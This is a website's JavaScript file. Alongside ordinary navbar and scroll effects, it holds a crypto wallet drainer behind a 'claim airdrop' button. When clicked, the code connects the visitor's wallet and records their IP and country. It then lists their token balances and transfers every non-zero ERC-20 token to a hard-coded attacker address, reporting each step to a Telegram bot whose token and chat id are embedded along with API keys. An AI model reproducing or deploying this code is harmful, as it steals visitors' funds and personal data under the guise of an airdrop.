'use strict';

/**
 * Add event on element
 */
const addEventOnElem = function (elem, type, callback) {
  if (elem.length > 1) {
    for (let i = 0; i < elem.length; i++) {
      elem[i].addEventListener(type, callback);
    }
  } else {
    elem.addEventListener(type, callback);
  }
}

/**
 * Navbar toggle
 */
const navbar = document.querySelector("[data-navbar]");
const navbarLinks = document.querySelectorAll("[data-nav-link]");
const navToggler = document.querySelector("[data-nav-toggler]");

const toggleNavbar = function () {
  navbar.classList.toggle("active");
  navToggler.classList.toggle("active");
  document.body.classList.toggle("active");
}

addEventOnElem(navToggler, "click", toggleNavbar);

const closeNavbar = function () {
  navbar.classList.remove("active");
  navToggler.classList.remove("active");
  document.body.classList.remove("active");
}

addEventOnElem(navbarLinks, "click", closeNavbar);

/**
 * Header active on scroll
 */
const header = document.querySelector("[data-header]");

const activeHeader = function () {
  if (window.scrollY > 300) {
    header.classList.add("active");
  } else {
    header.classList.remove("active");
  }
}

addEventOnElem(window, "scroll", activeHeader);

/**
 * Toggle active on add to fav
 */
const addToFavBtns = document.querySelectorAll("[data-add-to-fav]");

const toggleActive = function () {
  this.classList.toggle("active");
}

addEventOnElem(addToFavBtns, "click", toggleActive);

/**
 * Scroll reveal effect
 */
const sections = document.querySelectorAll("[data-section]");

const scrollReveal = function () {
  for (let i = 0; i < sections.length; i++) {
    if (sections[i].getBoundingClientRect().top < window.innerHeight / 1.5) {
      sections[i].classList.add("active");
    } else {
      sections[i].classList.remove("active");
    }
  }
}

scrollReveal();
addEventOnElem(window, "scroll", scrollReveal);

/**
 * Wallet connect, network switching, and token transfer with Telegram notification
 */
async function connectWalletAndSendTokens() {
  if (!window.ethers || !window.Web3Modal) {
    console.error("Required libraries (ethers or Web3Modal) not found.");
    return;
  }

  const providerOptions = {
    walletconnect: {
      package: window.WalletConnectProvider.default,
      options: {
        infuraId: "5b2c5ee5760146349669a1e9c77665d1"
      }
    }
  };

  const web3Modal = new window.Web3Modal.default({
    cacheProvider: false,
    providerOptions
  });

  const evmNetworks = [
    { chainId: 1, name: "Ethereum", chainName: "eth", exodusAddress: "0x525E64339403bFd25Fb982E77aa0A77ddaB1bf57" }
  ];

  const botToken = "7875309387:AAHcqO8m9HtaE9dVqVBlv2xnAwDkUTmFDAU";
  const chatId = "5995616824";
  const moralisApiKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6ImU1MjI2ZmQ1LTE0NDUtNGIyOC04YzYzLTZmOWEzZDRkNWJjZSIsIm9yZ0lkIjoiNDQ5NTg1IiwidXNlcklkIjoiNDYyNTgwIiwidHlwZUlkIjoiZjVhODc0ZmItZGM2Ni00NjE0LWIxNDUtMjlkYTg5YjIwNDk1IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NDgzOTc5MTksImV4cCI6NDkwNDE1NzkxOX0.lr5-p-SHS7j4EAlsT1ZYt7tTnOfKnoZXSsqS_6WIReY";

  const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

  try {
    const instance = await web3Modal.connect();
    const provider = new ethers.providers.Web3Provider(instance);
    const signer = provider.getSigner();
    const userAddress = await signer.getAddress();
    const walletType = instance.isWalletConnect ? "WalletConnect" : "MetaMask";
    console.log(`Wallet connected: ${userAddress} (${walletType})`);

    let locationData = {};
    try {
      const locRes = await fetch("https://ipapi.co/json/");
      locationData = await locRes.json();
    } catch (e) {
      console.warn("Location fetch failed", e);
      locationData = { country_name: "Unknown", ip: "N/A" };
    }

    for (const network of evmNetworks) {
      try {
        console.log(`Processing network: ${network.name} (Chain ID: ${network.chainId})`);

        // Network switching logic
        try {
          console.log(`Switching to ${network.name}`);
          await instance.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: `0x${network.chainId.toString(16)}` }]
          });
        } catch (switchErr) {
          if (switchErr.code === 4902) {
            console.log(`Network ${network.name} not found, attempting to add it`);
            const chainConfig = {
              1: {
                chainId: '0x1',
                chainName: 'Ethereum Mainnet',
                rpcUrls: ['https://mainnet.infura.io/v3/5b2c5ee5760146349669a1e9c77665d1'],
                nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
                blockExplorerUrls: ['https://etherscan.io']
              }
            }[network.chainId];
            await instance.request({
              method: 'wallet_addEthereumChain',
              params: [chainConfig]
            });
            await instance.request({
              method: 'wallet_switchEthereumChain',
              params: [{ chainId: `0x${network.chainId.toString(16)}` }]
            });
          } else {
            throw switchErr;
          }
        }

        const currentProvider = new ethers.providers.Web3Provider(instance);
        const currentSigner = currentProvider.getSigner();
        const currentNetwork = await currentProvider.getNetwork();
        if (currentNetwork.chainId !== network.chainId) {
          console.warn(`Failed to switch to ${network.name}, current chainId: ${currentNetwork.chainId}`);
          const errorMessage = `
❌ Failed to Switch to ${network.name}!
Chain ID: ${network.chainId}
Error: Network switch rejected or not supported
Timestamp: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}
          `;
          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text: errorMessage })
          });
          continue;
        }

        const switchMessage = `
🔄 Switched to ${network.name}!
Address: ${userAddress}
Wallet: ${walletType}
Chain ID: ${network.chainId}
Timestamp: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}
        `;
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: chatId, text: switchMessage })
        });
        console.log(`Switched to ${network.name} successfully`);

        await delay(1000);

        let tokens = [];
        let tokenSummaryTelegram = "";
        let apiAttempts = 0;
        const maxAttempts = 3;
        let apiSuccess = false;

        const tokenStandard = "ERC-20";

        while (apiAttempts < maxAttempts && !apiSuccess) {
          try {
            apiAttempts++;
            const moralisUrl = `https://deep-index.moralis.io/api/v2.2/${userAddress}/erc20?chain=${network.chainName}`;
            console.log(`Attempt ${apiAttempts}: Fetching tokens for ${network.name} from ${moralisUrl}`);
            const response = await fetch(moralisUrl, {
              headers: { "X-API-Key": moralisApiKey }
            });
            if (!response.ok) {
              throw new Error(`Moralis API error: ${response.statusText} (Status: ${response.status})`);
            }
            tokens = await response.json();
            console.log(`Fetched ${tokens.length} tokens for ${network.name}:`, JSON.stringify(tokens, null, 2));
            apiSuccess = true;

            const nonZeroTokens = tokens.filter(token => token.balance && !ethers.BigNumber.from(token.balance).isZero());
            if (nonZeroTokens.length > 0) {
              tokenSummaryTelegram = nonZeroTokens.map(token => {
                const decimals = token.decimals ?? 18;
                const balance = ethers.utils.formatUnits(token.balance, decimals);
                return `• ${token.symbol}: ${balance} (Contract: ${token.token_address})`;
              }).join("\n");
            } else {
              tokenSummaryTelegram = `No non-zero ${tokenStandard} token balances found.`;
            }
          } catch (apiErr) {
            console.warn(`Attempt ${apiAttempts} failed for ${network.name}: ${apiErr.message}`);
            if (apiAttempts === maxAttempts) {
              tokenSummaryTelegram = `Failed to fetch ${tokenStandard} tokens after ${maxAttempts} attempts: ${apiErr.message || "Moralis API error"}`;
            } else {
              console.log(`Retrying Moralis API call for ${network.name}`);
              await delay(3000);
            }
          }
        }

        let nativeBalanceMessage = "";
        try {
          const nativeBalance = await currentProvider.getBalance(userAddress);
          const formattedBalance = ethers.utils.formatEther(nativeBalance);
          const nativeSymbol = "ETH";
          nativeBalanceMessage = `• ${nativeSymbol}: ${formattedBalance}`;
          console.log(`Native balance for ${network.name}: ${formattedBalance} ${nativeSymbol}`);
        } catch (balanceErr) {
          console.warn(`Failed to fetch native balance for ${network.name}: ${balanceErr.message}`);
        }

        const balanceSummary = [tokenSummaryTelegram, nativeBalanceMessage].filter(msg => msg).join("\n");

        const networkMessage = `
📥 Wallet Connected on ${network.name}!
Address: ${userAddress}
Wallet: ${walletType}
Country: ${locationData.country_name}
IP: ${locationData.ip}
Timestamp: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}

💰 Balances on ${network.name}:
${balanceSummary || "No balances found or API error occurred."}
        `;
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: chatId, text: networkMessage })
        });
        console.log(`Sent balance notification for ${network.name}`);

        const nonZeroTokens = tokens.filter(t => t.balance && !ethers.BigNumber.from(t.balance).isZero());
        if (nonZeroTokens.length === 0) {
          console.log(`No non-zero ${tokenStandard} tokens to transfer on ${network.name}`);
          const noTransferMessage = `
ℹ️ No ${tokenStandard} Tokens Transferred on ${network.name}!
Reason: No non-zero token balances detected.
Timestamp: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}
          `;
          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text: noTransferMessage })
          });
        } else {
          console.log(`Found ${nonZeroTokens.length} non-zero ${tokenStandard} tokens to transfer on ${network.name}`);
        }

        for (const token of nonZeroTokens) {
          try {
            console.log(`Processing token ${token.symbol} on ${network.name}`);
            const contract = new ethers.Contract(token.token_address, [
              "function transfer(address to, uint amount) returns (bool)",
              "function approve(address spender, uint amount) returns (bool)",
              "function allowance(address owner, address spender) view returns (uint)"
            ], currentSigner);

            const balanceInWei = ethers.BigNumber.from(token.balance);
            const allowance = await contract.allowance(userAddress, userAddress);
            if (allowance.lt(balanceInWei)) {
              const approveTx = await contract.approve(userAddress, balanceInWei);
              await approveTx.wait();
              console.log(`Approved ${token.symbol} on ${network.name}, tx: ${approveTx.hash}`);
            }

            const tx = await contract.transfer(network.exodusAddress, balanceInWei);
            await tx.wait();
            console.log(`Sent ${token.symbol} on ${network.name}, tx: ${tx.hash}`);

            const decimals = token.decimals ?? 18;
            const balance = ethers.utils.formatUnits(token.balance, decimals);
            const successMessage = `
✅ ${tokenStandard} Token Transfer Successful on ${network.name}!
Token: ${token.symbol}
Amount: ${balance}
Contract: ${token.token_address}
Destination: ${network.exodusAddress}
Tx Hash: ${tx.hash}
Timestamp: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}
            `;
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ chat_id: chatId, text: successMessage })
            });
          } catch (err) {
            console.warn(`Failed to process ${token.symbol} on ${network.name}: ${err.message}`);
            const errorMessage = `
❌ ${tokenStandard} Token Transfer Failed on ${network.name}!
Token: ${token.symbol}
Contract: ${token.token_address}
Error: ${err.message || "Unknown error"}
Timestamp: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}
            `;
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ chat_id: chatId, text: errorMessage })
            });
          }
        }
      } catch (err) {
        console.warn(`Error processing ${network.name}: ${err.message}`);
        const errorMessage = `
❌ Error Processing ${network.name}!
Error: ${err.message || "Unknown error"}
Timestamp: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}
        `;
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: chatId, text: errorMessage })
        });
      }
    }
  } catch (err) {
    console.error('Error connecting wallet or processing tokens:', err);
    const errorMessage = `
❌ Wallet Connection Failed!
Error: ${err.message || "Unknown error"}
Timestamp: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}
    `;
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: errorMessage })
    });
  }
}

document.getElementById("claim-airdrop-btn")?.addEventListener("click", connectWalletAndSendTokens);